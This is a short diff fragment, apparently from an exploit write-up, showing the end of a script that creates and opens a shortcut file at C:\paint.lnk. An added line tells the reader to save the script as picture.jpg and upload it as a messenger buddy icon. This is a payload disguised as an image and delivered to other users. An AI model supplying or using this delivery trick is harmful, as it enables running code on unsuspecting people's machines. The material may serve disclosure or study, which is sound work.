@@ -12,7 +12,7 @@ l.Save("C:\\paint.lnk");
 ok.Open("C:\\paint.lnk");
 </script>
 
-
+^ save above in notepad as a picture.jpg and then upload it as your buddy icon.
 
 Sending to yourself first a file is written to the following known location that you have to find:
 
